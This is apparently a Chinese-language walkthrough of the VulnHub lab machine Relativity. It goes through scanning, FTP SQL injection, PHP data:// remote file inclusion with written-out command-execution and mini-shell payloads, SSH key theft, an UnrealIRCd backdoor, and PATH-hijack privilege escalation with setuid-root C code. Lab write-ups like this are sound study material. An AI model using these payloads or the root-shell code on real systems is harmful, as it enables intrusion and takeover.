# 下载地址

    
    
    https://download.vulnhub.com/devrandom/relativity_1.0.1.zip
    

# **实战演练**

使用netdiscover命令查找靶机的IP

![image.png](https://image.3001.net/images/20190804/1564883177_5d4638e99b565.png)使用nmap查看靶机开放的端口

![image.png](https://image.3001.net/images/20190804/1564883389_5d4639bd18c58.png)打开浏览器

![image.png](https://image.3001.net/images/20190804/1564883480_5d463a187c287.png)

爆破目录，没找到什么  
![image.png](https://image.3001.net/images/20190804/1564883613_5d463a9d051c4.png!small)

![image.png](https://image.3001.net/images/20190804/1564883791_5d463b4fc54d1.png)  
FTP登录试试

![image.png](https://image.3001.net/images/20190804/1564883861_5d463b95b9868.png)使用anonymous登录失败，不过我注意到一个banner

`220 Welcome to Relativity FTP (mod_sql)`  

google一下，找到一个[SQL注入漏洞](https://www.rapid7.com/db/vulnerabilities/ftp-proftpd-sql-injection)，EXP在[这里](https://www.securityfocus.com/bid/33722/exploit)

成功进去了，这个目录就是http服务器的目录

![image.png](https://image.3001.net/images/20190804/1564884998_5d464006ca1da.png)在浏览器打开这个目录

![image.png](https://image.3001.net/images/20190804/1564885043_5d4640339f294.png)查看页面源代码，好像有文件包含漏洞

![image.png](https://image.3001.net/images/20190804/1564886655_5d46467f43ab8.png)我尝试了一些本地文件包含，但它没有让我任何地方。为了进入下一步，我需要一些外部阅读和灵感。对于漏洞利用，我们可以利用PHP的流包装器：PHP附带了许多用于各种URL样式协议的内置包装器，用于文件系统函数，如fopen（），copy（），file_exists（）和filesize（），这里面有篇[文章](https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/)的攻击应用  

    
    
    # simple RFI
    page=data://text/plain, <?php system("whoami");?>
    
    # base64 encoded RFI
    page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTs/Pg==
    
    # mini shell
    page=data://text/plain,<?php system($_GET[cmd]);?>&cmd=id
    
    # base64 + URL encoded mini shell (didn't work without URL encoding)
    page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&cmd=id

执行成功

![image.png](https://image.3001.net/images/20190804/1564886895_5d46476f9933d.png)查看passwd文件

![image.png](https://image.3001.net/images/20190804/1564886928_5d4647900789a.png!small)查看home目录下

![image.png](https://image.3001.net/images/20190804/1564887051_5d46480bd2086.png)

这个目录没东西  
![image.png](https://image.3001.net/images/20190804/1564887092_5d4648342bf27.png)mauk目录有个.SSH文件夹

![image.png](https://image.3001.net/images/20190804/1564887150_5d46486e21868.png)

进入可以看到有个公钥和私钥  
![image.png](https://image.3001.net/images/20190804/1564887170_5d4648828d91f.png)私钥

![image.png](https://image.3001.net/images/20190804/1564887215_5d4648af34604.png)  

使用私钥登录mauk账号

![image.png](https://image.3001.net/images/20190804/1564887400_5d46496846d9c.png)找到/opt下有个东西

![image.png](https://image.3001.net/images/20190804/1564887687_5d464a87d5889.png)查看端口开放情况

![image.png](https://image.3001.net/images/20190804/1564887805_5d464afd71d72.png!small)本地开放了6667端口

    
    
    IRC（Internet Relay Chat的缩写，“因特网中继聊天”）是一种透过网络的即时聊天方式。其主要用于群体聊天，但同样也可以用于个人对个人的聊天。IRC使用的服务器端口有6667（明文传输，如irc://irc.freenode.net）、6697（SSL加密传输，如ircs://irc.freenode.net:6697）等。

靶机上面没有nc命令，不能做端口转发，那就用SSH做端口转发

![image.png](https://image.3001.net/images/20190804/1564887931_5d464b7bbf4dd.png!small)

kali扫描本地4444端口  
![image.png](https://image.3001.net/images/20190804/1564888052_5d464bf407bac.png)

这个版本存在一个后门漏洞，具体看[这里](https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html)

端口占用了，改一下ssh转发的端口

![image.png](https://image.3001.net/images/20190804/1564888373_5d464d356fbef.png)![image.png](https://image.3001.net/images/20190804/1564888609_5d464e213ab34.png!small)这个exp好像不行，换另外一种方法

测试能不能生成1文件

![image.png](https://image.3001.net/images/20190804/1564889526_5d4651b60be80.png)![image.png](https://image.3001.net/images/20190804/1564889561_5d4651d9d3512.png)

nc监听  
![image.png](https://image.3001.net/images/20190804/1564889855_5d4652ff662f1.png)

![image.png](https://image.3001.net/images/20190804/1564889833_5d4652e9e9241.png)

看看怎么提权

![image.png](https://image.3001.net/images/20190804/1564890056_5d4653c8a0b7d.png)  
运行这个程序，发现字符串不断变化

![image.png](https://image.3001.net/images/20190804/1564890221_5d46546d6865b.png)查看这个程序的信息。`fortune`不是从它的完整相对路径调用，但/usr/bin/cowsay是。这意味着，如果我可以欺骗二进制文件，让其他人知道这个`fortune`命令，那么我就可以根据这个框进行操作。特别是如果我能让它认为我的bash
shell是`fortune`

![image.png](https://image.3001.net/images/20190804/1564890332_5d4654dc8f629.png)这个可以利用这个机制进行搞事

    
    
    #root.c
    int main()
    {
      setreuid(0,0,0);
      setregid(0,0,0);
      system("/bin/bash");
      return 0;
    }
    
    #fortune.c
    
    int main()
    {
      system("chown root:root /tmp/root; chmod +s,a+rwx /tmp/root");
      return 0;
    }
    

![image.png](https://image.3001.net/images/20190804/1564891121_5d4657f1b55d0.png)

![image.png](https://image.3001.net/images/20190804/1564891286_5d46589668ddd.png)修改环境变量

    
    
    export PATH="/tmp:$PATH"
    

  
![image.png](https://image.3001.net/images/20190804/1564892162_5d465c02e0b7f.png)  

  

**=-=好像是因为终端shell的问题，一直不行**

